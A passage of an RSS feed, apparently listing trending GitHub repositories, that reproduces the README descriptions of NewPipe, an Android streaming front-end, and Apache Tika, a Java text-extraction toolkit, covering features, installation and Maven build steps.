 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/openjdk/jdk/master/doc/building.md"&gt;doc/building.md&lt;/a&gt; (markdown version)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;See &lt;a href="https://openjdk.org/"&gt;https://openjdk.org/&lt;/a&gt; for more information about the OpenJDK Community and the JDK and see &lt;a href="https://bugs.openjdk.org"&gt;https://bugs.openjdk.org&lt;/a&gt; for JDK issue tracking.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>TeamNewPipe/NewPipe</title>
      <link>https://github.com/TeamNewPipe/NewPipe</link>
      <description>&lt;p&gt;A libre lightweight streaming front-end for Android.&lt;/p&gt;&lt;hr&gt;&lt;h3 align="center"&gt;We are &lt;i&gt;rewriting&lt;/i&gt; large chunks of the codebase, to bring about &lt;a href="https://newpipe.net/blog/pinned/announcement/newpipe-0.27.6-rewrite-team-states/#the-refactor"&gt;a modern and stable NewPipe&lt;/a&gt;! You can download nightly builds &lt;a href="https://github.com/TeamNewPipe/NewPipe-refactor-nightly/releases"&gt;here&lt;/a&gt;.&lt;/h3&gt; 
&lt;h4 align="center"&gt;Please work on the &lt;code&gt;refactor&lt;/code&gt; branch if you want to contribute &lt;i&gt;new features&lt;/i&gt;. The current codebase is in maintenance mode and will only receive &lt;i&gt;bugfixes&lt;/i&gt;.&lt;/h4&gt; 
&lt;p align="center"&gt;&lt;a href="https://newpipe.net"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/assets/new_pipe_icon_5.png" width="150" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2 align="center"&gt;&lt;b&gt;NewPipe&lt;/b&gt;&lt;/h2&gt; 
&lt;h4 align="center"&gt;A libre lightweight streaming front-end for Android.&lt;/h4&gt; 
&lt;p align="center"&gt;&lt;a href="https://f-droid.org/packages/org.schabi.newpipe/"&gt;&lt;img src="https://fdroid.gitlab.io/artwork/badge/get-it-on-en.svg?sanitize=true" alt="Get it on F-Droid" width="206/" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/TeamNewPipe/NewPipe/releases" alt="GitHub NewPipe releases"&gt;&lt;img src="https://img.shields.io/github/release/TeamNewPipe/NewPipe.svg?sanitize=true" /&gt;&lt;/a&gt; &lt;a href="https://github.com/TeamNewPipe/NewPipe-nightly/releases" alt="GitHub NewPipe nightly releases"&gt;&lt;img src="https://img.shields.io/github/release/TeamNewPipe/NewPipe-nightly.svg?labelColor=purple&amp;amp;label=dev%20nightly" /&gt;&lt;/a&gt; &lt;a href="https://github.com/TeamNewPipe/NewPipe-refactor-nightly/releases" alt="GitHub NewPipe refactor nightly releases"&gt;&lt;img src="https://img.shields.io/github/release/TeamNewPipe/NewPipe-refactor-nightly.svg?labelColor=purple&amp;amp;label=refactor%20nightly" /&gt;&lt;/a&gt; &lt;a href="https://www.gnu.org/licenses/gpl-3.0" alt="License: GPLv3"&gt;&lt;img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg?sanitize=true" /&gt;&lt;/a&gt; &lt;a href="https://github.com/TeamNewPipe/NewPipe/actions" alt="Build Status"&gt;&lt;img src="https://github.com/TeamNewPipe/NewPipe/actions/workflows/ci.yml/badge.svg?branch=dev&amp;amp;event=push" /&gt;&lt;/a&gt; &lt;a href="https://hosted.weblate.org/engage/newpipe/" alt="Translation Status"&gt;&lt;img src="https://hosted.weblate.org/widgets/newpipe/-/svg-badge.svg?sanitize=true" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://web.libera.chat/#newpipe" alt="IRC channel: #newpipe"&gt;&lt;img src="https://img.shields.io/badge/IRC%20chat-%23newpipe-brightgreen.svg?sanitize=true" /&gt;&lt;/a&gt; &lt;a href="https://matrix.to/#/#newpipe:matrix.newpipe-ev.de" alt="Matrix channel: #newpipe"&gt;&lt;img src="https://img.shields.io/badge/Matrix%20chat-%23newpipe-blue" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;p align="center"&gt;&lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#screenshots"&gt;Screenshots&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#supported-services"&gt;Supported Services&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#description"&gt;Description&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#features"&gt;Features&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#installation-and-updates"&gt;Installation and updates&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#contribution"&gt;Contribution&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#donate"&gt;Donate&lt;/a&gt; • &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#license"&gt;License&lt;/a&gt;&lt;/p&gt; 
&lt;p align="center"&gt;&lt;a href="https://newpipe.net"&gt;Website&lt;/a&gt; • &lt;a href="https://newpipe.net/blog/"&gt;Blog&lt;/a&gt; • &lt;a href="https://newpipe.net/FAQ/"&gt;FAQ&lt;/a&gt; • &lt;a href="https://newpipe.net/press/"&gt;Press&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;em&gt;Read this document in other languages: &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.de.md"&gt;Deutsch&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/README.md"&gt;English&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.es.md"&gt;Español&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.fr.md"&gt;Français&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.hi.md"&gt;हिन्दी&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.it.md"&gt;Italiano&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.ko.md"&gt;한국어&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.pt_BR.md"&gt;Português Brasil&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.pl.md"&gt;Polski&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.pa.md"&gt;ਪੰਜਾਬੀ &lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.ja.md"&gt;日本語&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.ro.md"&gt;Română&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.so.md"&gt;Soomaali&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.tr.md"&gt;Türkçe&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.zh_TW.md"&gt;正體中文&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.asm.md"&gt;অসমীয়া&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/doc/README.sr.md"&gt;Српски&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/README.ar.md"&gt;العربية&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!warning] &lt;b&gt;THIS APP IS IN BETA, SO YOU MAY ENCOUNTER BUGS. IF YOU DO, OPEN AN ISSUE IN OUR GITHUB REPOSITORY BY FILLING OUT THE ISSUE TEMPLATE.&lt;/b&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;b&gt;PUTTING NEWPIPE, OR ANY FORK OF IT, INTO THE GOOGLE PLAY STORE VIOLATES THEIR TERMS AND CONDITIONS.&lt;/b&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/00.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/00.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/01.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/01.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/02.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/02.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/03.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/03.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/04.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/04.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/05.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/05.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/06.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/06.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/07.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/07.png" width="160" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/08.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/phoneScreenshots/08.png" width="160" /&gt;&lt;/a&gt; &lt;br /&gt;&lt;br /&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/tenInchScreenshots/09.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/tenInchScreenshots/09.png" width="405" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/tenInchScreenshots/10.png"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/fastlane/metadata/android/en-US/images/tenInchScreenshots/10.png" width="405" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Supported Services&lt;/h3&gt; 
&lt;p&gt;NewPipe currently supports these services:&lt;/p&gt; 
&lt;!-- We link to the service websites separately to avoid people accidentally opening a website they didn't want to. --&gt; 
&lt;ul&gt; 
 &lt;li&gt;YouTube (&lt;a href="https://www.youtube.com/"&gt;website&lt;/a&gt;) and YouTube Music (&lt;a href="https://music.youtube.com/"&gt;website&lt;/a&gt;) (&lt;a href="https://en.wikipedia.org/wiki/YouTube"&gt;wiki&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;PeerTube (&lt;a href="https://joinpeertube.org/"&gt;website&lt;/a&gt;) and all its instances (open the website to know what that means!) (&lt;a href="https://en.wikipedia.org/wiki/PeerTube"&gt;wiki&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Bandcamp (&lt;a href="https://bandcamp.com/"&gt;website&lt;/a&gt;) (&lt;a href="https://en.wikipedia.org/wiki/Bandcamp"&gt;wiki&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;SoundCloud (&lt;a href="https://soundcloud.com/"&gt;website&lt;/a&gt;) (&lt;a href="https://en.wikipedia.org/wiki/SoundCloud"&gt;wiki&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;media.ccc.de (&lt;a href="https://media.ccc.de/"&gt;website&lt;/a&gt;) (&lt;a href="https://en.wikipedia.org/wiki/Chaos_Computer_Club"&gt;wiki&lt;/a&gt;)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;As you can see, NewPipe supports multiple video and audio services. Though it started off with YouTube, other people have added more services over the years, making NewPipe more and more versatile!&lt;/p&gt; 
&lt;p&gt;Partially due to circumstance, and partially due to its popularity, YouTube is the best supported out of these services. If you use or are familiar with any of these other services, please help us improve support for them! We're looking for maintainers for SoundCloud and PeerTube.&lt;/p&gt; 
&lt;p&gt;If you intend to add a new service, please get in touch with us first! Our &lt;a href="https://teamnewpipe.github.io/documentation/"&gt;docs&lt;/a&gt; provide more information on how a new service can be added to the app and to the &lt;a href="https://github.com/TeamNewPipe/NewPipeExtractor"&gt;NewPipe Extractor&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Description&lt;/h2&gt; 
&lt;p&gt;NewPipe works by fetching the required data from the official API (e.g. PeerTube) of the service you're using. If the official API is restricted (e.g. YouTube) for our purposes, or is proprietary, the app parses the website or uses an internal API instead. This means that you don't need an account on any service to use NewPipe.&lt;/p&gt; 
&lt;p&gt;Also, since they are free and open source software, neither the app nor the Extractor use any proprietary libraries or frameworks, such as Google Play Services. This means you can use NewPipe on devices or custom ROMs that do not have Google apps installed.&lt;/p&gt; 
&lt;h3&gt;Features&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Watch videos at resolutions up to 4K&lt;/li&gt; 
 &lt;li&gt;Listen to audio in the background, only loading the audio stream to save data&lt;/li&gt; 
 &lt;li&gt;Popup mode (floating player, aka Picture-in-Picture)&lt;/li&gt; 
 &lt;li&gt;Watch live streams&lt;/li&gt; 
 &lt;li&gt;Show/hide subtitles/closed captions&lt;/li&gt; 
 &lt;li&gt;Search videos and audios (on YouTube, you can specify the content language as well)&lt;/li&gt; 
 &lt;li&gt;Enqueue videos (and optionally save them as local playlists)&lt;/li&gt; 
 &lt;li&gt;Show/hide general information about videos (such as description and tags)&lt;/li&gt; 
 &lt;li&gt;Show/hide next/related videos&lt;/li&gt; 
 &lt;li&gt;Show/hide comments&lt;/li&gt; 
 &lt;li&gt;Search videos, audios, channels, playlists and albums&lt;/li&gt; 
 &lt;li&gt;Browse videos and audios within a channel&lt;/li&gt; 
 &lt;li&gt;Subscribe to channels (yes, without logging into any account!)&lt;/li&gt; 
 &lt;li&gt;Get notifications about new videos from channels you're subscribed to&lt;/li&gt; 
 &lt;li&gt;Create and edit channel groups (for easier browsing and management)&lt;/li&gt; 
 &lt;li&gt;Browse video feeds generated from your channel groups&lt;/li&gt; 
 &lt;li&gt;View and search your watch history&lt;/li&gt; 
 &lt;li&gt;Search and watch playlists (these are remote playlists, which means they're fetched from the service you're browsing)&lt;/li&gt; 
 &lt;li&gt;Create and edit local playlists (these are created and saved within the app, and have nothing to do with any service)&lt;/li&gt; 
 &lt;li&gt;Download videos/audios/subtitles (closed captions)&lt;/li&gt; 
 &lt;li&gt;Open in Kodi&lt;/li&gt; 
 &lt;li&gt;Watch/Block age-restricted material&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- Hidden span to keep old links compatible. You should remove this span if you're translating the README into another language.--&gt; 
&lt;p&gt;&lt;span id="updates"&gt;&lt;/span&gt;&lt;/p&gt; 
&lt;h2&gt;Installation and updates&lt;/h2&gt; 
&lt;p&gt;You can install NewPipe using one of the following methods:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Add our custom repo to F-Droid and install it from there. The instructions are here: &lt;a href="https://newpipe.net/FAQ/tutorials/install-add-fdroid-repo/"&gt;https://newpipe.net/FAQ/tutorials/install-add-fdroid-repo/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Download the APK from &lt;a href="https://github.com/TeamNewPipe/NewPipe/releases"&gt;GitHub Releases&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/#apk-info"&gt;compare the signing key&lt;/a&gt; and install it.&lt;/li&gt; 
 &lt;li&gt;Update via F-Droid. This is the slowest method of getting updates, as F-Droid must recognize changes, build the APK itself, sign it, and then push the update to users.&lt;/li&gt; 
 &lt;li&gt;Build a debug APK yourself. This is the fastest way to get new features on your device, but is much more complicated, so we recommend using one of the other methods.&lt;/li&gt; 
 &lt;li&gt;If you're interested in a specific feature or bugfix provided in a Pull Request in this repo, you can also download its APK from within the PR. Read the PR description for instructions. The great thing about PR-specific APKs is that they're installed side-by-side the official app, so you don't have to worry about losing your data or messing anything up.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;We recommend method 1 for most users. APKs installed using method 1 or 2 are compatible with each other (meaning that if you installed NewPipe using either method 1 or 2, you can also update NewPipe using the other), but not with those installed using method 3. This is due to the same signing key (ours) being used for 1 and 2, but a different signing key (F-Droid's) being used for 3. Building a debug APK using method 4 excludes a key entirely. Signing keys help ensure that a user isn't tricked into installing a malicious update to an app. When using method 5, each APK is signed with a different random key supplied by GitHub Actions, so you cannot even update it. You will have to backup and restore the app data each time you wish to use a new APK.&lt;/p&gt; 
&lt;p&gt;In the meanwhile, if you want to switch sources for some reason (e.g. NewPipe's core functionality breaks and F-Droid doesn't have the latest update yet), we recommend following this procedure:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Back up your data via Settings &amp;gt; Backup and Restore &amp;gt; Export Database so you keep your history, subscriptions, and playlists&lt;/li&gt; 
 &lt;li&gt;Uninstall NewPipe&lt;/li&gt; 
 &lt;li&gt;Download the APK from the new source and install it&lt;/li&gt; 
 &lt;li&gt;Import the data from step 1 via Settings &amp;gt; Backup and Restore &amp;gt; Import Database&lt;/li&gt; 
&lt;/ol&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Note] When you're importing a database into the official app, always make sure that it is the one you exported &lt;em&gt;from&lt;/em&gt; the official app. If you import a database exported from an APK other than the official app, it may break things. Such an action is unsupported, and you should only do so when you're absolutely certain you know what you're doing.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;APK Info&lt;/h3&gt; 
&lt;p&gt;This is the SHA fingerprint of NewPipe's signing key to verify downloaded APKs which are signed by us. The fingerprint is also available on &lt;a href="https://newpipe.net#download"&gt;NewPipe's website&lt;/a&gt;. This is relevant for method 2.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;CB:84:06:9B:D6:81:16:BA:FA:E5:EE:4E:E5:B0:8A:56:7A:A6:D8:98:40:4E:7C:B1:2F:9E:75:6D:F5:CF:5C:AB
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contribution&lt;/h2&gt; 
&lt;p&gt;Whether you have ideas, translations, design changes, code cleaning, or even major code changes, help is always welcome. The app gets better and better with each contribution, no matter how big or small! If you'd like to get involved, check our &lt;a href="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/.github/CONTRIBUTING.md"&gt;contribution notes&lt;/a&gt;.&lt;/p&gt; 
&lt;a href="https://hosted.weblate.org/engage/newpipe/"&gt; &lt;img src="https://hosted.weblate.org/widgets/newpipe/-/287x66-grey.png" alt="Translation status" /&gt; &lt;/a&gt; 
&lt;h2&gt;Donate&lt;/h2&gt; 
&lt;p&gt;If you like NewPipe, you're welcome to send a donation. We prefer Liberapay, as it is both open-source and non-profit. For further info on donating to NewPipe, please visit our &lt;a href="https://newpipe.net/donate"&gt;website&lt;/a&gt;.&lt;/p&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://liberapay.com/TeamNewPipe/"&gt;&lt;img src="https://upload.wikimedia.org/wikipedia/commons/2/27/Liberapay_logo_v2_white-on-yellow.svg?sanitize=true" alt="Liberapay" width="80px" /&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://liberapay.com/TeamNewPipe/"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/assets/liberapay_qr_code.png" alt="Visit NewPipe at liberapay.com" width="100px" /&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://liberapay.com/TeamNewPipe/donate"&gt;&lt;img src="https://raw.githubusercontent.com/TeamNewPipe/NewPipe/dev/assets/liberapay_donate_button.svg?sanitize=true" alt="Donate via Liberapay" height="35px" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;Privacy Policy&lt;/h2&gt; 
&lt;p&gt;The NewPipe project aims to provide a private, anonymous experience for using web-based media services. Therefore, the app does not collect any data without your consent. NewPipe's privacy policy explains in detail what data is sent and stored when you send a crash report, or leave a comment in our blog. You can find the document &lt;a href="https://newpipe.net/legal/privacy/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://www.gnu.org/licenses/gpl-3.0.en.html"&gt;&lt;img src="https://www.gnu.org/graphics/gplv3-127x51.png" alt="GNU GPLv3 Image" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;NewPipe is Free Software: You can use, study, share, and improve it at will. Specifically you can redistribute and/or modify it under the terms of the &lt;a href="https://www.gnu.org/licenses/gpl.html"&gt;GNU General Public License&lt;/a&gt; as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>apache/tika</title>
      <link>https://github.com/apache/tika</link>
      <description>&lt;p&gt;The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF).&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to Apache Tika &lt;a href="https://tika.apache.org/"&gt;https://tika.apache.org/&lt;/a&gt;&lt;/h1&gt; 
&lt;p&gt;&lt;a href="http://www.apache.org/licenses/LICENSE-2.0"&gt;&lt;img src="https://img.shields.io/github/license/apache/tika.svg?maxAge=2592000" alt="license" /&gt;&lt;/a&gt; &lt;a href="https://ci-builds.apache.org/job/Tika/job/tika-main-jdk17/"&gt;&lt;img src="https://img.shields.io/jenkins/s/https/ci-builds.apache.org/job/Tika/job/tika-main-jdk17.svg?maxAge=3600" alt="Jenkins" /&gt;&lt;/a&gt; &lt;a href="https://ci-builds.apache.org/job/Tika/job/tika-main-jdk17/lastBuild/testReport/"&gt;&lt;img src="https://img.shields.io/jenkins/t/https/ci-builds.apache.org/job/Tika/job/tika-main-jdk17.svg?maxAge=3600" alt="Jenkins tests" /&gt;&lt;/a&gt; &lt;a href="http://search.maven.org/#search%7Cga%7C1%7Cg%3A%22org.apache.tika%22"&gt;&lt;img src="https://img.shields.io/maven-central/v/org.apache.tika/tika.svg?maxAge=86400" alt="Maven Central" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Apache Tika(TM) is a toolkit for detecting and extracting metadata and structured text content from various documents using existing parser libraries.&lt;/p&gt; 
&lt;p&gt;Tika is a project of the &lt;a href="https://www.apache.org"&gt;Apache Software Foundation&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Apache Tika, Tika, Apache, the Apache feather logo, and the Apache Tika project logo are trademarks of The Apache Software Foundation.&lt;/p&gt; 
&lt;h1&gt;Getting Started&lt;/h1&gt; 
&lt;p&gt;Pre-built binaries of Apache Tika standalone applications are available from &lt;a href="https://tika.apache.org/download.html"&gt;https://tika.apache.org/download.html&lt;/a&gt; . Pre-built binaries of all the Tika jars can be fetched from Maven Central or your favourite Maven mirror.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Tika 2.X and support for Java 8 reached End of Life (EOL) in April, 2025. See &lt;a href="https://cwiki.apache.org/confluence/display/TIKA/Tika+Roadmap+--+2.x%2C+3.x+and+Beyond"&gt;Tika Roadmap 2.x, 3.x and beyond&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Tika is based on &lt;strong&gt;Java 17&lt;/strong&gt; and uses the &lt;a href="https://maven.apache.org"&gt;Maven 3&lt;/a&gt; build system. &lt;strong&gt;N.B.&lt;/strong&gt; &lt;a href="https://www.docker.com/products/personal"&gt;Docker&lt;/a&gt; is used for tests in tika-integration-tests. As of Tika 2.5.1, if Docker is not installed, those tests are skipped. Docker is required for a successful build on earlier 2.x versions.&lt;/p&gt; 
&lt;p&gt;To build Tika from source, use the following command in the main directory:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;mvn clean install
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The build consists of a number of components, including a standalone runnable jar that you can use to try out Tika features. You can run it like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;java -jar tika-app/target/tika-app-*.jar --help
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To build a specific project (for example, tika-server-standard):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;mvn clean install -am -pl :tika-server-standard
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If the ossindex-maven-plugin is causing the build to fail because a dependency has now been discovered to have a vulnerability:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;mvn clean install -Dossindex.skip
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;Maven Dependencies&lt;/h1&gt; 
&lt;p&gt;Apache Tika provides &lt;em&gt;Bill of Material&lt;/em&gt; (BOM) artifact to align Tika module versions and simplify version management. To avoid convergence errors in your own project, import this bom or Tika's parent pom.xml in your dependency management section.&lt;/p&gt; 
&lt;p&gt;If you use Apache Maven:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;project&amp;gt;
  &amp;lt;dependencyManagement&amp;gt;
    &amp;lt;dependencies&amp;gt;
      &amp;lt;dependency&amp;gt;
       &amp;lt;groupId&amp;gt;org.apache.tika&amp;lt;/groupId&amp;gt;
       &amp;lt;artifactId&amp;gt;tika-bom&amp;lt;/artifactId&amp;gt;
       &amp;lt;version&amp;gt;4.x.y&amp;lt;/version&amp;gt;
       &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
       &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt;
      &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;
  &amp;lt;/dependencyManagement&amp;gt;

  &amp;lt;dependencies&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.apache.tika&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;tika-parsers-standard-package&amp;lt;/artifactId&amp;gt;
      &amp;lt;!-- version not required since BOM included --&amp;gt;
    &amp;lt;/dependency&amp;gt;
  &amp;lt;/dependencies&amp;gt;
&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For Gradle:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-kotlin"&gt;dependencies {
  implementation(platform("org.apache.tika:tika-bom:4.x.y"))

  // version not required since bom (platform in Gradle terms)
  implementation("org.apache.tika:tika-parsers-standard-package")
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;Migrating to 4.x&lt;/h1&gt; 
&lt;p&gt;TBD&lt;/p&gt; 
&lt;h1&gt;Contributing via Github&lt;/h1&gt; 
&lt;p&gt;See the &lt;a href="https://github.com/apache/tika/raw/main/.github/pull_request_template.md"&gt;pull request template&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Please open pull requests against the &lt;code&gt;main&lt;/code&gt; branch. We locked &lt;code&gt;master&lt;/code&gt; in September 2020 and no longer use it.&lt;/p&gt; 
&lt;h2&gt;Thanks to all the people who have contributed&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/apache/tika/graphs/contributors"&gt;&lt;img src="https://contributors-img.web.app/image?repo=apache/tika" alt="contributors" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Building from a Specific Tag&lt;/h1&gt; 
&lt;p&gt;Let's assume that you want to build the 3.0.1 tag:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;0. Download and install hub.github.com
1. git clone https://github.com/apache/tika.git 
2. cd tika
3. git checkout 3.0.1
4. mvn clean install
&lt;/code&gt;&lt;/pre&gt; 
